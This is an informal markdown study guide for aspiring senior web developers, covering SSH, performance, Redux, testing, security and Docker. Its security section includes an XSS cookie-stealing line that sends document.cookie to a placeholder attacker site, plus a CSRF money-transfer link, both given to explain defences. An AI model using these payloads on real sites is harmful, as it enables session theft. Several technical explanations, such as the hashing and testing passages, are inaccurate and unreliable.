# Become a Senior Developer

Becoming a **Senior Developer** is a long path and it's not that simple.
You have to know really a lot of things, but, there is a big difference between knowing **a lot of things** and knowing **everything**.
Of course, I want you to know everything.

No, just kidding. It's really impossible.

So, the concept behind being a Senior Developer is not knowing everything about everything, but is knowing HOW to think. HOW to solve a problem. HOW to provide the best solution.
It's all about the way of doing things, not really how much you know in each topic. I want you to get it.
To be a Senior Developer, you just have to know "a little" about the main topics, such as Security, Code Analysis, Code Organization, Tests, Perfomance, and so on.

I'm sure you can have all the skills to become a Senior Developer.
Hope I can help to follow that path.

*Big hug <3




# SSH

SSH (Secure Shell) is a protocol, or a shared algorithm that allows to comunicate between two computers over the internet. Allows users to edit data and so on.
It's a protocol to use over shells, that's why it's different from the HTTPS protocol.
It use encryption to ensure that the connections are secure.

How to use it?
It's simple, you just have to write `ssh`, the user, and the host (IP Address) in your terminal.

```console
ssh {user}@{host}
```

Using this command you can connect your computer with another one wherever in the world.

Actually, to use GitHub you now have to use SSH.

To be a senior developer, you also must know how to configure a server to accept SSH connections.

## EXAMPLE: Restore a project from github to the server

What if your whole project got deleted from the server by mistake, and now you have to restore it?
Because usually there's an empty Linux OP, you have to install all dependencies, like git, npm, and so on.
In the example, I use fake data.
Here some simple steps:

```console
ssh root@167.99.146.57
sudo apt-get install git
git clone {your_project}
sudo apt-get install nodejs
npm install
```

## EXAMPLE: Clone a directory from your computer to the server

```console
cd project.com
rsync -av . root@167.99.146.57:~/project.com
ssh root@67.99.146.57
ls
```

(more info on `rsync`: https://www.tecmint.com/rsync-local-remote-file-synchronization-commands/)

## How it works

How does SSH works?
There are 3 techniques used in SSH:
1. **Symmetrical Encryption**
2. **Asymettrical Encryption**
3. **Hashing**

### Symmetrical Encryption

Symmetric Encryption uses **1 secret keys** for both encryption and decryption of the data. Anyone who possess this key can so read and write data. This is, actually, a problem.
But, we have to get that key in a secure way, that is done with the **Key Exchange Algorithm**. What makes this algorithm secure, is the fact that the key is never actually transmitted between the data, but the client and the host share public pieces of data and then manipulate it to acutallu calculate the key.
Once the key has been generated, all packages must be encrypted.

### Asymmetrical Encryption

Unlike Symmetrical Encryption, Asymettrical Encryption needs two seperate keys: one for encryption, and one for decryption.
These two keys are known as **public** and **private** keys, and together form the **public-private keys** (wow!).
The private key _can not mathematically compute from the public key_. This means that a message that is crypted by the public key, can only be decrypted with the other machine private key (**one-way relationship**).
This form of encryption is actually only used in the Key Exchange Algorithm in the Symmetrical Encryption.
They temporary create public and private keys, and share their respective keys the one to the other. At this point we're able to get the symmetric keys using something that is called the **Difiie Hellman Key Exchange**, that basically use a little of each information to generate the correct key for both computers.
This type of encryption is almost used everywhere.
More about asymettrical encryption in these youtube videos:
* https://www.youtube.com/watch?v=NmM9HA2MQGI
* https://www.youtube.com/watch?v=Yjrfm_oRO0w
* https://www.youtube.com/watch?v=vsXMMT2CqqE&t=
* https://www.youtube.com/watch?v=NF1pwjL9-DE


### Hashing

Since Asymettric Encryption is more time consuming, most SSH connection use Symmetic Encryption. The idea behind is that Asymettric is used only to share the public key and using that key to enstablish a secure connection between the host and the client. Once it has been enstablished the server uses the client's public key to generate a challenge and transmit it to the client for authentication. If the client can successfully decrypt the message, it means it have the right private key, and the secure connection begins.

One problem.
Someone can sit in the middle, pretending to be the other, and modify the data (**middleman**).
To solve this problem, we introduce **hashing**.
Hashing it's another form of cryptography used in SSH connections.
Hashing protocols are never meant to decrypt anything. They only _encrypt data in a fixed lenght_ for each input that it gets, so that we have no idea on how to get back to the original data from an hashed data.

But, i guess you can't figure it out the reason why it's used. I mean, what can you do with an ashed data that you can't decrypt?
Here's how it works:
The original message is sent through the SSH connection. The same message, but hashed, is sent through a different tunnel. The host then receive the hashed message from the client, with also the "original" message. Then, the host hash the original message, and if it's equal to the hashed one that he received, then the it's not been modified from a middleman.
It may sound a little bit complicated, but that's how it works.

## Password or RSA

To enstablish a connection via SSH in the terminal, you, of course, need to be authenticated.
The steps are this:

1. Diffie-Hellman Key Exchange
2. Arrive at Symmetric Key
3. Make sure of no funny businnes
4. Authenticate User

The default behavior to authenticate a user is the use of a password. But, actually, there is another method, because the use of a simple password can be dangerous: someone can use brute-force or something to get that password.
You can use RSA: the authentication of a user without password, with a private and public key.

### Generating public/private RSA key pair

First of all, check you .ssh folder in you computer:

```console
cd ~/.ssh
open .
ls
```

To create the keys to comunicate via SSH with another computer, you have to run this command:

```console
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
```

-C = comment 

You can change the path for you SSH to `/Users/lorenzo/.ssh/id_rsa_example` (replace "example" with whatever you want). 
You can then choose a passphrase, or just press enter.
You have created your first public/private RSA key pairs! Good Job.
In your folder, you'll now have two new files:
* id_rsa_example
* id_rsa_example.pub

The first one is the private key. Never ever share this to anyone!
You can now copy the public key and share it with the server you wanna enstablish the connection with:

```console
pbcopy < ~/.ssh/id_rsa_example.pub
```

Then, enstablish the connection with your server.
If the server doen't have an `.ssh`folder, create one in the root, enter in it, and create/edit an `authorized_keys` file, then add you copied public RSA key. Save the file, and exit:

```console
mkdir .ssh
cd .ssh
nano authorized_keys
exit
```

With these commands, you're telling the server to accept messages with a certain private key.
You wanna then return in you `.ssh` folder, and add the private key to your "user", with this command:

```console
ssh-add ./id_rsa_example
```

Then, try to enstablish again the connection :)
No Password required!
You enstablished a connection with your server using RSA Keys.

## Setup SSH on Github

To set up and SSH key for GitHub (I think in your career this will be your main use of SSH) you simply have to:
1. Create and SSH key like we did before
2. Use the generated Private key with `ssh-add`
3. Copy to the clipboard the public key
4. Go into github in the settings of your profile, and under the SSH create a new key pasting what you've copied in the previous step

And you're done :)




# Performance

> "Can you make our webiste faster, please?"

Aaaah... Performance...
That's a really important topic. If a page load time slow down by 1s, that could cost **1.6 million dollars** in an agency. Really, I'm not joking.
So, how can you prioritize and optimize the performance of your website?
Let's see the core principles.

There are 3 places where the work needs to happen, and that we can improve:
1. The **Frontend** - Client side
2. The **Transfer** - Network latency, HTTPS requests
3. The **backend** - Processing of data

We can improve each part, but not randomly. You, first, have to **Unserstand** what slow down your site, and then act and make actions to improve the performance.

Let's first Focus on the Middle part: the **Transfer part**.

Note:
> "Early optimization is the root of all evil"

Never try to optimize your code during development and never think about it until the job it's fully finished. This can result on a waste of time and useless complications.

## Network performance

To view a web page, your computer has to download all of the files from the server to display them in the browser. The more they are big, the longer will be the time to download them.
So, the first thing to think about, is to minimize the files that you offer (Javascript, CSS, Images, and so on).

For text files (like CSS, JS, HTML), the process is pretty simple: you just have to put the original code in a minimizer (you can find one online) and the job is done :D.
People used to do that manually (with softwares), but, now, this is integrated in our **build process** (like webpack).

For images, it's a little bit more complex.
THe primary way to optimize an image, it's to change it's format (e.g. from `SVG` to `JPG`).

* GIF - Good for small animations
* JPG - For complex images with lots of colors
* PNG - For transparent backgrounds. Limits the number of colors, so it's usually smaller.
* SVG - Really good for icons and "simple" images.

For more about file types: https://99designs.com/blog/tips/image-file-types/

To optimize images, you want to pick the right format and the compress them. Follow these guide:

* Want transparency? **PNG**
* Animations? **GIF**
* Colorful images? **JPG**
* Simple icons, logos, illustrations? **SVG**
* Reduce PNG with **TinyPNG** (website)
* Reduce JPG with **JPEG-optimizer** (website)
* Try to choose **simple illustrations** over highly details photographs
* Always **lower JPEG image quality** (30-60%)
* **Resize images** based on size it will be displayed
* Display different sized images for different backgrounds
* Use CDNs like **imgix**
* Remove image **metadata**

Also, if you use for example background images in CSS, you want to use `@media queries` to change the image with the right resolution based on the screen size. Media queries doesn't download images when they aren't computed, because the comptuer knows that it doesn't need that images. And, that's really really good.

**Imgix** is a software that take care of all images, caches them, and so on. But, it has a price.

What about **metadata**? Metadata are some data that are into the picture, just like the device who took the phot, where and when it's been taken, and so on. And, of course, this information are useless.

## Delivery optimization

There is a more fundamental approach in optimization, after minimizing files: reducing the number of requests.
First of all, we must request only the things that we _need_, and, for example, avoid whole external resources that can do simply things (e.g. don't download jQuery only for query selection!!).
So, after having excluded the things that we don't need, you should "compact" all the same resources in the same file. Example: all JSs in one `bundle.js` file, all CSSs in one `styles.css` file, and so on.

### Bundling

To bundle our JS files there are actually 3 main tools:
1. Webpack - The most used one, but with a lot of configuration
2. Parcel - The fastest and with 0 configuration. Used usually for relatively small projects
3. RollupJS - Used usually when uploading packages via NPM

## Critical Render

The critical render path is the process of rendering the page on the screen.

```
        DOMContentLoad                      Load
              |                              |
DOM -> CSSOM -> Render Tree -> Layout -> Paint
```

### DOM (HTML)

Let's analyze the first step: the **HTML (DOM)**. How to optimize it?
As soon as an HTML file finds script and link tags, it starts downloading these external resources (that takes an higher priority than images). How do we optimize the HTML file?
You usually want to load styles as soon as possible, and scripts as late as possible. You want the CSS to style your page first.
If you place your script tags in the head, you potentially block the page from rendering, because they usually require the page to be fully loaded. By placing them at the bottom of the body, you actually are simply improving the first-loading-time of the page.
To see that, you can try to put a script with an alert on the end of the body, and then the same on the head. In the second case you'll see that the alert will block the download of another CSS file (not good).

### CSSDOM

What aboout **CSS (CSSOM)**?
CSS is called **_render blocking_**, because in order to construct the _render Tree_, we first need to load the CSS, so we want to load the styles as soon and fast as possible.
There are just a few things that we need to consider:

* **Only Load whatever is needed** - don't include in your file classes that aren't actually used in your HTML page.
* **Above the fold loading** - You wanna load immeditely only the CSSs that affects the first-content that a user will see, and include in the head only the styles that are important in the first-render. But, how can you do that? Actually, you just have to include a script AFTER the first-content that will render the links to your other CSSs files, like this:
  ```javascript
  const loadStyleSheet = src => {
    if(document.createStylesheet){
      document.createStylesheet(src)
    } else {
      const stylesheet = document.createElement('link')
      stylesheet.href = src
      stylesheet.rel = 'stylesheet'
      stylesheet.type = 'text/css'
      document.getElementByTagName('head')[0].appendChild(stylesheet)
    }
  }
  window.onload = function(){
    // Only loads styles after the page will load
    console.log('Window done :)')
    loadStyleSheet('./style.css')
  }
  ```
* **Media attributes** - You can also load links only based on the media query, like that:
  ```html
  <link rel="stylesheet" href="./style.css" media="only screen and(min-width:500px)">
  <!-- Default media value: "all" -->
  <!-- This only loads the `style.css` file only if the screen in bigger than 500px -->
  ```
* **Less specificity** - The more specific you'll be, the more the file will be big, and, also, the more calculation the computer will have to do, slowing all down.
* Theoretically, `<style>`'s tags and element inline style will improve the performance of the site (_but it's not scalable/flexible/reusable!!_)

### DOMContentLoaded

The problem with Javascripts is that they can alter the DOM and the CSSOM and they have an higher priority than CSSs files, so, as we said before, they can block the content from rendering.
For operations that requires manipulation of the DOM, you can use the `document.addEventListener('DOMContentLoaded', yourFunction)`, that only execute when the dom loaded, as its name says.
Here's some things you can do to optimize the loading of your JSs without blocking the whole page.
* **Load scripts asynchronously** - With an `<script async>`, you basically say that the download of the file must start while the HTML is parsing (without stopping it, that is the normal behaviour), then, when it finishes, it will be executed, stopping the HTML parsing.
  > Use `async` and `defer` only if the scripts doesn't have to affect the DOM! (e.g. Google Analytics, and tracking in general)
* **Defer Loading of scripts** - The `<script defer>` does the same thing, BUT, the execution of the file will only be done once the HTML parsing is fully completed. This types of script are really really good if they act on the DOM (opposite of async scripts), but they also are non important (The main files should NOT have either async or defer)
* **Minimize DOM manipulations** - Every DOM manipulation cause a re-render of the Render Tree.
* **Avoid long running Javascript** - (like alerts. Something that completely block the page.)

The location of the script tags when you put `async` or `defer` attributes on them is important. For more: https://stackoverflow.com/questions/10808109/script-tag-async-defer

### EXERCISE: Optimize a site

Look at this [Github Repo](https://github.com/aneagoie/keiko-corp) and try to optimize the site. This may look "massive" (not really), and you surely don't know where to start.
First of all, try to make a test on https://pagespeed.web.dev/ and see if actually there is something that you can optimize.
Of course there will be something :D
Then, look at the HTML file. You'll see a lot of links and scripts that you can surely bundle all together (all JSs in a `bundle.js` file and all CSSs in a `styles.css` file). Of course, first you can also minimize them.
The second thing you'll note, is that all scripts are in the head tag. Really bad. If a script is not that important, add it in the `</body>` closing tag.
Then, explore the `network tab` of the site in the developer tool. Check the size of the images, and see what you can compress, which images can fit in the mobile, and maybe images that you doesn't need.
Remove also all the scripts and CSS that you maybe doesn't need: alway ask yourself "Can I do this by myself? Do I really need a Library?".
Summarizing:
1. Analyze page speed (https://pagespeed.web.dev/)
2. Look HTML File
3. Remove libraries/images that you doesn't need
4. Minimize all the files (CSSs and JSs)
5. Place the scripts in the closing body tag
6. Bundle together all files of the same type (and in the same position, if there are some scripts in the head, and some in the body, these are 2 different bundle scripts).
7. Compress big images.
8. Check the `network tab` of the developer tools.
9. Pretty Done! For now.

## HTTP/2 and HTTP/3

HTTP/2 is un update of the existing HTTP Protocol that will make our applications faster, simple, and more robust. The primary goals for HTTP/2 are to reduce latency by enabling full request and response multiplexing, minimize protocol overhead via efficient compression of HTTP header fields, and add support for request prioritization and server push. HTTP/2 modifies how the data is formatted (framed) and transported between the client and server.
More in the extra resources of this section.

HTTP/3 is in very early development and we still have a long ways until it becomes commonplace. Again, more in the extra resources.


## Frontend

When you talk about otpimizing teh frontend of you wep page, you always end up talking about **Optimized Code** and **Progressive Web App** (A Mobile APP that has similar native performance and can run offline).

### Optimized code

One of the Javascript heaviest cost is the time of the Javascript Engine to parse and compile the code.
You can check the actual performance of the site in the developer tools, under the `performance` section. Particulary, for the optimized code you should check the `scripting` time (that usually is the bigger part).
The actual time to get the page interactive is the sum of the **compile time**, **parse time**, and **execution time**.
We ideally wanna have a fast **time to first meaningful paint**, and fast **time to interactive**.

#### Code splitting

**Code splitting** (or progressive bootstrapping) allows us to reduce the amount of work been done during the execution. You wanna send out a minimally page and lazy load the other non-main features, such as the code used for the "about" or "contact" page. So:
You load _only_ the code for the current page (e.g. the home), and only after you finish, just once the page is already interactive, you can "unlock" the scripts for the other pages, and **lazy-load** them, making the page faster and giving the impression that moving from one page to the other is instantaneous.
This is done with dynamic imports (or dynamicly added script tags) (see `code-splitting` example).
Actually, there are 2 types of code-splitting (that can be done both together):
1. Route split - You do dynamic imports based on routes
2. Component split - You do dynamic imports based on the single component

### PWA

A PWA (Progressive Web App) is a website that allow users to interact with the web page in many ways. It's meant to transform a Wep App to a near native App.
So, you can actually _download_ and use the Wep page in your mobile phone, even without internet connection.

#### HTTPS

In general, you should alway use HTTPS as a protocol for your website, but, because you can have access to the local storage of your mobile, PWAs **require HTTPS**, altough they won't work, and you won't be able to download locally the app.

#### Viewport

Before talking about how to actually make your website PWA-compatible, make sure you have in your html this meta tag:

```html
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
```

This is a MUST.
Ok. Let's move on.

#### App Manifest

First of all, a PWA requires a **Manifest**. Let's see how we can create it.
To create a manifest, you have to add in your root a `manifest.json` file.
Here you have to add your icons and splash screen.
But, first, let's see the main structure:
```json
{
  "short_name": "My PWA",
  "name": "My Progressive Web APP",
  "icons": [
    {
      "src": "favicon.ico",
      "sizes": "64x64 32x32 24x24 16x16",
      "type": "image/x-icon"
    }
  ]
  "start_url": "./index.html",
  "display": "standalone",
  "theme_color": "#000000",
  "background_color": "#ffffff",
}
```

#### Service Worker

A **ServiceWorker** is the last piece to create succesfully a PWA. First of all, you want to check if a `navigator.serviceWorker` is available in your browser, then, you have to register your custom `service-worker.js`. You can find a default online.
And... that's it :D.
Pretty easy, right?
Create React App does all of the above steps automatically.

### PWA process

For a detailed process to create a Progressive Web App, from A to Z, check this documentation offered by Google: https://web.dev/learn/pwa/


##  Backend

What can we do on the backend to oprimize its performance?

### CDNs

The first thing are **CDNs**: _Content Delivery Networks_.
It helps with accelereting almost every website by caching files all over the world. Content is automatically served from the nearest server.
So, it improves (a lot) the network requests and also block spammers, and handle a lot of other things, automatically. It's also really secure.
The three major companies that offers Content Delivery Network are:
* Cloudflare
* Microsoft Azure
* Amazon

CDNs solve the latency problem (delay by the phisical distance from the user and your server).

### GZIP and Brotli

**GZIP** is probably the biggest and the best way to optimize performance, and, luckily for us, it's really really easy to implement it.
From a folder, GZIP will simply convert all the files to the `.gzip` extensions, and those files will be significantly smaller.
I sais it was easy to implement, and I was not lying.
See this example in NodeJS and Express:

```javascript
const compression = require('compression')
const express = require('express')
const app = express()

app.use(compression())
```

Done! :D
Now, all of the content that you send to the browser will be gzip.
All modern browsers support GZIP.

Actually, there is a litte thing, developed by Google, that is just a little better than GZIP, and it's **Brotli**. Most of the time it will have 20% better compression than GZIP, but it's not widly used.
So, keep an eye on it, because it will probably surpass GZIP ;)

### Database Scaling

There are 6 main ways that a Database can scale:
1. Identify Inefficient Queries - Create indexes
2. Increase Memory - Improve hardware
3. Vertical Scaling (Redis, Memchaced) - Add another service so that your system actually uses resources better
4. Sharding - Break down the data into different pieces (e.g. all user with age <= 30 in one place and the users with age > 30 in the other one)
5. More Databases - And split requests to each database (e.g. if you have 3 databases, split requests by 33% each)
6. Database type - Use more different types of databases based on the operations you must perform

### Caching

Caching is the process of storing data in a temporary storage so that you can obtain resources a lot faster.
Caching it's actually almost everywhere.
In the server, you can for example cache the Database requests, API call results, and so on.
An optimal resource to cahce data is **Redis**, that we already covered.
In the frontend, almost every browser will have their cache. Also, you can use Service Workers, that, again, we already covered when we talked about **PWA**.

But, with cache there is actually a problem: what if we updated a file and the user don't see the new version because it has an older cached file? This is called **Cache Busting**. But, a lot of framework/libraries already solve this problem for us (such as create react app, next.js, and so on). The way to solve this problem is basically change it's name: for production build, softwares usually bundle files, for example, in a `bundle.vfe3eg.js` (the middle part is random), so, when there is an update, the bundler simply update that middle part, so that the browser have to re-download it.

In the server, you can also control the cache of the browser by adding some headers, such as setting the **Cache-control**.
Here's the example:

```javascript
get('/hi', (req, res) => {
  res.header('Cache-Control', 'public, max-age=86400')
  res.header('Content-type', 'text/html')
  res.send(new Buffer('<h2>Test String</h2>'));
})
```

Express here will generate an `ETag` in the response header, and based on it will decide if the cache is valid or not. If you for example modify a file that you are returning, express will change the ETag header so that it knows that the request must have an updated file. Also, a cached server file will have a `304` (not modified) status, while a new one will have the classic `200`(OK).

### Load Balancing

Load Balancing is a way for us to balance multiple requests at the same time and distribute them in different services. As we get more and more requests, the server can reach a status where it can not take them anymore.
There are 2 main resources that you can use to handle load balancing:
* **Apache HTTP Server**
* **NGINX**

NGINX implements cache and also multiple server requests. It will handle each request end send it to the server that is more free of work.


## Extra resources

* [Prefetching, Preloading, Prebrowsing](https://css-tricks.com/prefetching-preloading-prebrowsing/)
* [HTTP/2](https://developers.google.com/web/fundamentals/performance/http2/)
* [HTTP/3](https://blog.cloudflare.com/http3-the-past-present-and-future/)
* [PWA](https://medium.com/@firt/progressive-web-apps-on-ios-are-here-d00430dee3a7)




# State management

Complex applications always have some kind of state. An app needs to remember data in order to work, and the User Interface is constructed based on that state.
But, as the app becomes bigger and bigger, the state can get more and more complicated, and you start getting headache :(.
You need some sort of **state management**.
This is why **Redux** has been created.
You basically remove the state from the single object, and put it in a centralized state. It simplify a lot of things.

## Why Redux

* Good for managing large state
* Useful for sharing data between containers
* Predictable state management using the 3 principles
  1. Single source of truth
  2. State is read only
  3. Changes using pure functions

This is the main workflow of redux, called flux pattern:

```
Action -> Reducer -> Store -> Make changes
```




# Tests

Tests are fundamentals to be done before going in production.
There are 3 main types of test:
1. **Unit Tests** - Tests individual classes/functions. Cheapest and easiest to implement
2. **Integration tests** - Tests how different pieces of code works together (e.g. with a DB)
3. **Automation Tests** - Test real life scenario, and are the most difficult to implement. 

There are a lot of tools that you can use to run your tests.
Here's the main:
* **Jasmine**
* **Jest**
* **Mocha**
* **Chai**
* **Sinon**

## Unit Tests

Cover all small _pure functions_ to test. It allows us to write tests really really easy. Stateless React components are really easy to test because they are by definition, pure.

## Integration Tests

Integration tests are all about cross comunication within different units of code. Unlike Unit tests, you can almost create infinite integration tests.

## Automation tests

Automation tests (or End-to-end test) are UI tests that are done into the browser, and are tests that check that the correct view is displayed for the user.
There are a ton of devices, browsers, and so on, so for this reason automation tests are the most difficult tests to cover.

## Files

Tests are only done in a production environment, not in production. The way to identify a test JS file, is simply to name it as `\[name].test.js`.
So, if, for example, you wanna test your `App.js` React component, you simply have to create a file named `App.test.js`, and then edit it writing the instructions to make the test.




# Security

Security is a _really_ important topic in Web Development. Is like playing defense in a soccer or football game. This is fundamental to make you app win the match :).
When you talk about security, you want to follow some specific guidelines. Here's the list (I dig deep down for each later on):
* Injections
* 3rd Party Libraries
* Logging
* HTTPS Everywhere
* XSS & CSRF
* Code Secrets
* Secure Headers
* Access Control
* Data Management
* Don't trust anyone
* Authentication

## Injections {#injections}

Injections are like... the MOST important and mostcommon attack topic from the hackers.
That's why we want to start from here. If you protect your code to prevent Injection, you likely have done 50% of the work :D

But, what is injection?
==Injection is putting code inside another peace of code==. This often occurs in Databases, where maybe you receive as a parameter for your query a piece of code that, for example, DROP your database. This would be **_catastrophic_**.
Another example could be a page that print in the DOM what a user type. So, a user can type `<script>breakThePage()</script>`.

We can prevent Injections problems by:
* Sanitizing inputs - Only allow user to type only the correct value type (usually strings). Usually implemented with withelist or blacklists.
* Parametrize Queries - prevent SQL injections.  
* Knex.js or Other ORMS

## 3rd party libraries

As the project evolves, we usually keep adding 3rd party libraries. But, you can't know if the code you're using is secure or not, so you always wanna be careful. With npm packages, you can always run the command:

```console
npm audit fix
```

## Logging

Loggin is a really important part of your security check if you want to have control of what happens. You wanna gather information about how users uses your app, so that if a user tries to do something malevolent, you can follow the logs to block the user.
Inefficent and insufficient logging can cause your product to be insecure.
With nodeJS, two tools that i suggest are: **Morgan** and **Winston**.

You can use morgan as a middleware in your express app.
Winston is a logger for like... everything. I reccomend it in production.
Instead of `console.log(log)` you can use `winston.log(kindOfLogging, log)` and log whatevere you want.
You usually wanna log with a _TIMESTAMP_ and _USEFUL INFORMATION_ about what that specific action with its specific parameters returned.
The idea is, anyway, to store good information but not store any personal information and most importantly not send logging into the client (can be really dangerous!!).

For example, if a user try to sign up with an email that has already been used, you should't send an "Email already used" message, because the hacker can now understand that there is a user with the that email.

So, log information, as much as you can, but never send nothing to the client.

> Note: Logs does NOT prevent malicious attacks. But they can really help you to block them one they occured.

## HTTPS

HTTPS, as we know, is the _secure_ version of the HTTP. Nowadays, it's fundamental and, technically mandatory in some states, to deploy your Site in an HTTP protocol. This ensure that you are who you say you are.
To have an HTTPS version of your site, you have to first get an SSL/TLS Certificate.
How can you get it?
One of the many resources (this is Free), it's [Let's Encrypt](https://letsencrypt.org/it/).
Alternatives are:
* Deploy your site in hosted servers (such as GitHub, Vercel, Cloudflare, and so on)
* Buy an authority certificate

## XSS + CSRF {#xss-csrf}

**XSS** (_Cross Site Scripting_) and **CSRF** (_Cross Site Request Forgery_).
**XSS** occurs whenever an application includes untrusted data in a new webpage without proper validation or escaping.
It allows an hacker, or whatever, to execute some kind of scripts. For example, if in a comment you put `<script>breakThePage()</script>`, then every other user's browser will execute that script. We've seen this in the "[Injections](#injections)" chapter.
An example of malicius script can be:

```javascript
window.location = 'haxxed.com?cookie=' + document.cookie
```

This send the user to the "bad site" that the attacker created, also sending all the data (cookies) that the victim site have.

CSRF are attacks that make the user click a link to send him in a fake location.
An example:

```html
<a href="http://netbank.com/transfer.do?acct=Attacker&amount;=$100">Read more!</a>
```

If a user click in the link inside his trusted bank account, his browser will have the cookies to keep the user logged in, so the link can actually perform the action where the user have to pay $100 to the hacker.

To prevent this attack, you have to block _Cross Origin Resource Sharing_ (CORS), in other words, sending vulnerable data across different domains. You have to set the "Content-Security-Policy" in your reuqest's header to "script-src 'self'". If you add scripts to other libraries, you can simply secure each of them by adding 'https://your3rdpartylibrary.com' (where the link is the url of the library).

Some guidelines:
* Sanitize inputs
* Never use JS's `eval()` function
* No `document.write()`
* Content Security Policy
* Secure + HTTPOnly Cookies

One library to avoid CSRF in NodeJS is **csurf**.

Cute and funny resources to know more (this are actully really understandable and wishy squishy. I recommend them):
* https://www.hacksplaining.com/exercises/xss-stored
* https://www.hacksplaining.com/exercises/csrf

Here other resources. Less Squishy Wishy but more professional:
* https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
* https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

## Code Secrets

Talking about code secters, there are 2 thing that we don't want to share:
* Environment Variables
* Commit History

Environment variables contains potentially vulnerable information that you don't want the world to know (API keys, passwords, and so on...).
By putting your vulnerable information in your `.env` file, you ensure that the code doesn't contain your information. For this reason, you surely don't want to add it in your github or something else repository.

## Secure Heders

We talked a little about secure headers in the [XSS + CSRF](#xss-csrf) section.
But, let's see how you can implement that type of security.
In NodeJS, you can install the **helmet** package (`npm install helmet`).
If you then go in your app, you just have to do that:

```javascript
app.use(helmet())
``` 

Eeeeasy. Ahah :D

More:
* [HTTP Header fields](https://www.tutorialspoint.com/http/http_header_fields.htm)
* [Helmet Documentation](https://github.com/helmetjs/helmet)

## Access Control

Access control is all about having restrictions on what authenticated users can do. You want to make sure that you alway give the least amount of privilege possible. Give only enough that people can do their work.
This is called **Principal of least privilege**.

For this reason, you want to customize your CORS policy (rather than just type `app.use(cors())`). For example, you can add a whitelist of domains that can access your server:

```javascript
const whitelist = ['http://example1.com', 'http://example2.com']
const corsOptions = {
  origin: function(origin, callback){
    if(whitelist.indexOf(origin) !== -1)
      callback(null, true)
    else
      callback(new Error('Not allowed by CORS'))
  }
}
app.use(cors(corsOptions))
```

Ehehe.

## Data Management

There are a few topics to cover in data management:
1. You always want to be sure to have backups of your data.
2. You want to make sure to limit sensible data exposure (Use encryption for every sensible data).

Here's some tools:
* bcrypt, scrypt, Aragon2 - to encrypt passwords
* pgcrypto - encrypt a few columns of your DB

Example of bcrypt:

```javascript
bcrypt.hash('soup', null, null, function(err, hash){
  console.log(hash) // 'soup' = $evn39gcewj2305BLABLABLA...
})
bcrypt.compare('soup', '$evn39gcewj2305BLABLABLA...', function(res){
  console.log(res) // true
})
```

## Don't Trust Anyone

Really. Don't trust anyone. Even in real life...
No I'm just kidding (MAYBE???).
But, assuming that there are bad people everywhere, you have to make sure that when you build software you don't trust anyone.
I know it may sound funny and obvious, but it's really important to get that.
Don't trust me neither.
Neither your GF or your BFF or again your baby little child.
Everyone can have bad intentions. Even your cat. Every cat has bad intentions.

## Authentication

Last point.
Authentication. It means making sure that the persons that says who they are, are really the person that they says who they are. You usually have this certainty with passwords and current active sessions.
You already know it, but this is the last point the connect all the other one.

## All other attacks

If this topic is interesting to you and you want to learn more about how hackers attack systems, I recommend you go through the free lessons and exercises provided here. It is a lot of fun!

https://www.hacksplaining.com/lessons



## End <3

You really need a promotion now! <3 <3 <3 <3




# Code analysis

Code Analysis is a really reaaaally importatn topic if you want to become a Senior Developer. Most of the time, in your Senior Web Developer career, you won't be starting on a project right at the very beginning. Most of the time, they usually already have a big project to put you on, and before starting you have to analyze the code, reviewing it, and figure how it works only based on the code and (MAYBE) the documentation they wrote.

You usually also have to setup all you environment, by setting the Database, and other 100 things. This can become really frustrating.
For this reason, **Docker** was created, but, before diving into it, let's analyze code!

## Setting things up

Given a project, you usually are able to instantly run the project locally on your machine. But, if the project uses Databases, API keys, and so on, you have to configure the connections on your local machine.
So:
* Create a connection to a new local DB
* Get all the API keys that you need

## Analyze, Analyze, Analyze

Usually, you first analyze the folder structure in the server (at least, if you have to analyze the whole application. If you are assigned to analyze the frontend part only, just look in the client folders).
By looking at the server folder structure, you can usually get by yourself all the endpoints, and have a basic knowledge of how the app works and most importantly what it does.

In the client part, you do the same process, and try to get how the client is structurized (e.g. in a react App: how the React components are organized, how the state of the application is handled, and so on).

> Always start with the big picture, and thes slowly go deep down into a component

## Criticize

It happens very often that a developer looks at the code of an application and starts saying things like:
"Ooooh that code is so ugly!"
"Ooooh why the function is named that way? it's not descriptive at all!"
"Ooooh who wrote this code is so dumb!"

Well, don't do that.
You can't really know when the project was done, how many people worked on it, why the app has been structurized in a certain way, and so on.
So, you can't really criticize.
All you should do is look at the code in an "emotionless" way, and try to connect all the pieces to really know where you can put your hands first.




# Docker

In the last section we've seen how it's hard to start developing in a local environment. You have to create your local Database, create API keys, make sure that all the used tools works on you local machine, maybe you have to install 100 applications to make it run, and so on...
Well... Here it comes **Docker** to solve this problem, in a very elegant way.
Instead of having a giant, monolithic, project, dockers is structurized in "containers", micro-services. Each container communicate with each other to make things work.

## Containers

Containers are a "lightway version" of the full machine virtualization. They use the host operating system, and are able to have fast and easy access to a small application.
This makes sure that your application will run the same everywhere and anywhere.

We first have the host (where we can store our container). In top of the host we have the container (that we can create with just one command) and agdocker ain inside of it there is what is called an "image", that is what docker uses to bundle the application to a standalone executable package that can live inside the container.

## Docker Hub

Usually for similar project you have kindly the same docker to build. Luckly, **docker hub** exists, and is simply a place where you can get the container that maybe another user already created (you can compare it to NPM). Is higly adopted by many people and organizations.

## Creating a Docker

Before starting, you have to install Docker in your computer. You can download the Docker Desktop version directly here: https://www.docker.com/.

Creating a Docker is really easy (at least the basics).
All you have to do is, in your project's root folder, creating a file called `Dockerfile` (yes, without extensions).
Here, you can write the following (it's a example. Of course you will have to customize it based on your criteria):

```dockerfile
# Dependency used. It's a NodeJS Project
FROM node:16.12.0 

# Create app directory
RUN mkdir -p /usr/src/your-project
WORKDIR /usr/src/your-project

# Install app dependencies
COPY package.json /usr/src/your-project
RUN npm install

# Bundle app source
COPY . /usr/src/your-project

# Build arguments
ARG NODE_VERSION=16.12.0

# Environment
ENV NODE_VERSION $NODE_VERSION
```

For more about all the comands you can use in a Dockerfile, you can check the [Docker's Documentation](https://docs.docker.com/).

## Docker commands

Here you can find the list of the main commands used to work with docker.

### Building and running a docker container

After that, you cam run in your terminal (positioned in your project root folder) the following commnad:

```console
docker build -t your-container .
docker run -it your-container
```

This will build the **image** and will then run the container called "_your-container_", installing all the required dependencies.

You can execute the container in the background by adding the option `-d` next to `-it`.

If your app is a server that runs on `localhost:3000`, you can expose the docker port to your local machine, by adding another parameter in your run command:

```console
docker run -it -p 3000:3000 your-container
```

